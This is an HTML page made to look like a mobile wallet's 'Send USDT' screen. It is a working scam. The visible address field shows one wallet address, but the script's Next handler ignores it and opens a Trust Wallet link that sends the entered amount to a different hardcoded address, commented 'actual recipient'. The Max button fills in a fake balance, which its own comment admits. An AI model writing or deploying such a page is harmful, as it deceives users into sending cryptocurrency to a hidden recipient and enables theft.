<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      font-family: sans-serif;
      margin: 0;
      padding: 0;
      color: #000;
      height: 100%;
      background: #fff;
    }
    .container {
      padding: 16px;
    }
    label {
      display: block;
      margin: 20px 0 8px;
      font-size: 14px;
      color: #555;
    }
    .input-box {
      display: flex;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 0 10px;
      align-items: center;
    }
    .input-box input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }
    .input-box .clear-btn,
    .input-box .paste-btn {
      background: none;
      border: none;
      color: #0052ff;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      margin-left: 6px;
    }
    .amount-section {
      display: flex;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-top: 8px;
      align-items: center;
    }
    .amount-section input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }
    .amount-section span {
      padding: 0 12px;
      color: #0052ff;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }
    .converted {
      margin-top: 10px;
      color: #888;
      font-size: 14px;
    }
    .footer {
      padding: 16px;
      position: fixed;
      bottom: 0;
      width: 100%;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }
    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border-radius: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" id="address" value="0xc07506a44dd9E2A0d4F010465C40A80A2117219a">
      <button class="clear-btn" onclick="document.getElementById('address').value = ''">&times;</button>
      <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-section">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span onclick="setMax()">Max</span>
    </div>
    <div class="converted" id="converted">= $0.00</div>
  </div>

  <div class="footer">
    <button class="button" onclick="nextStep()">Next</button>
  </div>

  <script>
    function setMax() {
      // Set a fake high value as "Max"
      const fakeMax = 99999;
      document.getElementById("amount").value = fakeMax;
      document.getElementById("converted").innerText = "= $" + fakeMax;
    }

    function nextStep() {
      const amount = document.getElementById("amount").value;
      if (!amount || isNaN(amount) || Number(amount) <= 0) {
        alert("Please enter a valid USDT amount");
        return;
      }

      const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // actual recipient
      const token = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
      const coin = "20000714"; // Trust Wallet coin ID for USDT BEP-20

      const trustLink = `https://link.trustwallet.com/send?coin=${coin}&address=${receiver}&token_id=${token}&amount=${amount}`;
      window.location.href = trustLink;
    }
  </script>
</body>
</html>
